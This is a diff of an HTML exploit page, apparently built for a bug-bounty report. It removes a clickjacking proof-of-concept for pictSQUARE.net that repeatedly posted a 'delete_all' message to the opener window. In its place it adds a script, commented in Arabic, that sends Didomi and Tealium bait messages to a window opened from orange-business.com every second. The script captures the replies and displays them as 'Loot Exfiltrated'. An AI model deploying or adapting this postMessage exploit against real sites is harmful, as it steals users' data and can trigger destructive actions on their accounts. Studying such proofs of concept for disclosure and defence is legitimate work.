@@ -1,23 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - Proof of Concept</title>
+    <title>Exploit Page</title>
 </head>
 <body>
-    <div class="warning-box">
-        <h1>⚠️ Security Proof of Concept</h1>
-        <p>You have been redirected to this page due to a <b>Stored UI Redressing (Clickjacking)</b> vulnerability on <span class="highlight">pictSQUARE.net</span>.</p>
-        <p>You attempted to click a legitimate button (like "Favorite" or "Join Event"), but an invisible overlay intercepted your click.</p>
-        <p><i>Note to Security Team: If this were a real attack by a malicious actor, this page would be a highly convincing phishing clone designed to steal user credentials. No personal data was collected during this test.</i></p>
-    </div>
+    <h1>Waiting for Orange Data...</h1>
+    <p>Please check the console.</p>
+
+    <script>
+        // 1. إنشاء "رادار" لاستقبال الردود من موقع Orange
+        window.addEventListener("message", (event) => {
+            // عشان نتأكد إن الرد جاي من أورانج فعلاً
+            if (event.origin.includes("orange-business.com")) {
+                console.log("🔥 BINGO! Loot Exfiltrated from Orange 🔥");
+                console.log("Data Received:", event.data);
+                
+                // هنطبع الداتا على الشاشة عشان تصورها فيديو بسهولة
+                document.body.innerHTML += "<pre style='color:green;'>" + JSON.stringify(event.data, null, 2) + "</pre>";
+            }
+        });
+
+        // 2. إرسال "طُعم" لموقع أورانج عشان نجبره يرد علينا
+        // هنبعت كل ثانية لحد ما يصطاد الرد
+        setInterval(() => {
+            if (window.opener) {
+                // الطُعم بتاع Didomi SDK
+                window.opener.postMessage({
+                    "__didomiCall": {
+                        "callId": Date.now().toString(), 
+                        "type": "group", 
+                        "params": {}
+                    }
+                }, "*");
+                
+                // الطُعم بتاع Tealium (utag.js)
+                window.opener.postMessage("didomi-ready", "*");
+            }
+        }, 1000);
+    </script>
 </body>
-<script>
-  setInterval(() => {
-    if (window.opener) {
-      window.opener.postMessage('{"action":"delete_all"}', '*');
-    }
-  }, 1000);
-</script>
 </html>
